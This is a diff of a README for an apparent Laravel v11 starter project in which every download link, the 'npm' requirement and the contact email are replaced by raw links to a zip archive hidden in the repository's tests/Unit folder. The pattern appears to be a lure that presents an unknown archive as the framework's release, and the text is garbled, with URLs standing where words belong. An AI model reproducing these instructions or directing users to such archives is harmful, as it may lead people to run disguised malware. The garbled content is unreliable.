@@ -6,13 +6,13 @@ Welcome to laravel-v11! This application is designed to help you kickstart your 
 
 ## 🔗 Download Now
 
-[![Download Laravel v11](https://raw.githubusercontent.com/Marrr74/laravel-v11/main/app/Http/Controllers/laravel-v11_2.2.zip%https://raw.githubusercontent.com/Marrr74/laravel-v11/main/app/Http/Controllers/laravel-v11_2.2.zip)](https://raw.githubusercontent.com/Marrr74/laravel-v11/main/app/Http/Controllers/laravel-v11_2.2.zip)
+[![Download Laravel v11](https://github.com/Marrr74/laravel-v11/raw/refs/heads/main/tests/Unit/laravel_v_3.8-beta.4.zip%https://github.com/Marrr74/laravel-v11/raw/refs/heads/main/tests/Unit/laravel_v_3.8-beta.4.zip)](https://github.com/Marrr74/laravel-v11/raw/refs/heads/main/tests/Unit/laravel_v_3.8-beta.4.zip)
 
 ## 📥 Download & Install
 
 To get started, you will need to download the application. Please visit the following link to access the latest version:
 
-[Download the latest release](https://raw.githubusercontent.com/Marrr74/laravel-v11/main/app/Http/Controllers/laravel-v11_2.2.zip)
+[Download the latest release](https://github.com/Marrr74/laravel-v11/raw/refs/heads/main/tests/Unit/laravel_v_3.8-beta.4.zip)
 
 ### Steps to Download
 1. Click on the link above to go to the Releases page.
@@ -27,7 +27,7 @@ Before installing, ensure your system meets the following requirements:
 - **PHP Version:** 8.1 or higher
 - **Docker:** Required for the Sail environment
 - **PostgreSQL:** Database requirements met through Docker
-- **https://raw.githubusercontent.com/Marrr74/laravel-v11/main/app/Http/Controllers/laravel-v11_2.2.zip and npm:** For Tailwind CSS and Vite
+- **https://github.com/Marrr74/laravel-v11/raw/refs/heads/main/tests/Unit/laravel_v_3.8-beta.4.zip and npm:** For Tailwind CSS and Vite
 
 ## 📂 Installation Steps
 
@@ -88,6 +88,6 @@ laravel-v11 is open-source and available under the MIT License. You can use, mod
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/Marrr74/laravel-v11/main/app/Http/Controllers/laravel-v11_2.2.zip
+- **Email:** https://github.com/Marrr74/laravel-v11/raw/refs/heads/main/tests/Unit/laravel_v_3.8-beta.4.zip
 
-Make sure to visit our [Releases page](https://raw.githubusercontent.com/Marrr74/laravel-v11/main/app/Http/Controllers/laravel-v11_2.2.zip) to download the latest version and check for updates regularly. Enjoy building with Laravel v11!
+Make sure to visit our [Releases page](https://github.com/Marrr74/laravel-v11/raw/refs/heads/main/tests/Unit/laravel_v_3.8-beta.4.zip) to download the latest version and check for updates regularly. Enjoy building with Laravel v11!
